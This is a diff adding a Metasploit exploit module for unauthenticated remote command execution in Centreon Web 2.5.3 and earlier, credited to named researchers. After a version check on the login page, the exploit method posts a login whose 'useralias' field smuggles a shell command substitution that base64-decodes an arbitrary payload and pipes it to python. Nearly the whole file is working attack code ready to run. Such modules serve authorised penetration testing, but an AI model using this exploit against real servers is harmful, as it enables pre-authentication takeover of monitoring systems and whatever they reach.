@@ -1,0 +1,89 @@
+##
+## This module requires Metasploit: http://metasploit.com/download
+## Current source: https://github.com/rapid7/metasploit-framework
+###
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  include Msf::Exploit::Remote::HttpClient
+
+  Rank = ExcellentRanking
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'        => 'Centreon Web Useralias Command Execution',
+        'Description' => %q(
+          Centreon Web Interface <= 2.5.3 utilizes an ECHO for logging SQL
+          errors.  This functionality can be abused for arbitrary code
+          execution, and can be triggered via the login screen prior to
+          authentication.
+        ),
+        'Author'      =>
+          [
+            'h00die <mike@shorebreaksecurity.com>',         # module
+            'Nicolas CHATELAIN <n.chatelain@sysdream.com>'  # discovery
+          ],
+        'References'  =>
+          [
+            [ 'EDB', '39501' ]
+          ],
+        'License'        => MSF_LICENSE,
+        'Platform'       => ['python'],
+        'Privileged'     => false,
+        'Arch'           => ARCH_PYTHON,
+        'Targets'        =>
+          [
+            [ 'Automatic Target', {}]
+          ],
+        'DefaultTarget' => 0,
+        'DisclosureDate' => 'Feb 26 2016'
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(80),
+        OptString.new('TARGETURI', [ true, 'The URI of the Centreon Application', '/centreon/'])
+      ], self.class
+    )
+  end
+
+  def check
+    begin
+      res = send_request_cgi(
+        'uri'       => normalize_uri(target_uri.path, 'index.php'),
+        'method'    => 'GET'
+      )
+      /LoginInvitVersion"><br \/>[\s]+(?<version>[\d]{1,2}\.[\d]{1,2}\.[\d]{1,2})[\s]+<\/td>/ =~ res.body
+
+      if version && Gem::Version.new(version) <= Gem::Version.new('2.5.3')
+        vprint_good("Version Detected: #{version}")
+        Exploit::CheckCode::Appears
+      else
+        Exploit::CheckCode::Safe
+      end
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+  end
+
+  def exploit
+    begin
+      vprint_status('Sending malicious login')
+      send_request_cgi(
+        'uri'       => normalize_uri(target_uri.path, 'index.php'),
+        'method'    => 'POST',
+        'vars_post'  =>
+        {
+          'useralias'   => "$(echo #{Rex::Text.encode_base64(payload.encoded)} |base64 -d | python)\\",
+          'password'    => Rex::Text.rand_text_alpha(5)
+        }
+      )
+
+    rescue ::Rex::ConnectionError
+      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
+    end
+  end
+end
